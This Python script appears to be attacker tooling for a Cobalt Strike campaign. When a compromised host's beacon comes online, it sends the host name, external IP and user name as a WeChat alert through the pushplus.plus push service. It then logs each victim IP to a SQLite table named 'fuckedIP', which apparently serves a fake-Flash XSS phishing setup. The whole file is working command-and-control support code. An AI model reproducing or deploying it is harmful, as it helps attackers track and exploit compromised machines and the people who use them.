# encoding:utf-8
import argparse
import requests
import random
import string
import sqlite3
import json
import sys
import os.path

print(sys.path[0])
token = 'c3************************c' #在 http://www.pushplus.plus/push1.html 复制

parser = argparse.ArgumentParser(description='Beacon Info')
parser.add_argument('--computername')
parser.add_argument('--externalip')
parser.add_argument('--username')
args = parser.parse_args()

externalip = args.externalip
computername = args.computername
username = args.username
ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 8))

title = "CobaltStrike 上线提醒"
content = """

**您有新主机上线啦 ！**

**主机名: {}**

**IP: {}**

**用户名: {}**

**Token: {}**

**请注意查收哦 ~**
""".format( computername, externalip,username, ran_str)

url = 'http://www.pushplus.plus/send'
data = {
    "token":token,
    "title":title,
    "content":content,
    "template":"markdown",
    "channel":"wechat"
}
body=json.dumps(data).encode(encoding='utf-8')
headers = {'Content-Type':'application/json'}
requests.post(url,data=body,headers=headers)

#######flash-xss#####

if(not os.path.isfile(sys.path[0]+"/../js_flask/db/db.db")):
    try:
        conn = sqlite3.connect(sys.path[0]+"/../js_flask/db/db.db")
        cur = conn.cursor()
        creatDBsql='''CREATE TABLE fuckedIP
        (ID INTEGER PRIMARY KEY,
        ip TEXT);'''
        cur.execute(creatDBsql)
        conn.commit()
    except Exception as e:
        print(e)
        sys.exit()
try:
    conn = sqlite3.connect(sys.path[0]+"/../js_flask/db/db.db")
    cur = conn.cursor()
    externalip=(externalip,externalip)
    #去除重复
    insertSql='''insert into fuckedIP(ip) select ? where not exists(select 1 from fuckedIP where ip = ?) '''
    cur.execute(insertSql,externalip)
    conn.commit()
except Exception as e:
    print(e)
    sys.exit()
conn.close()




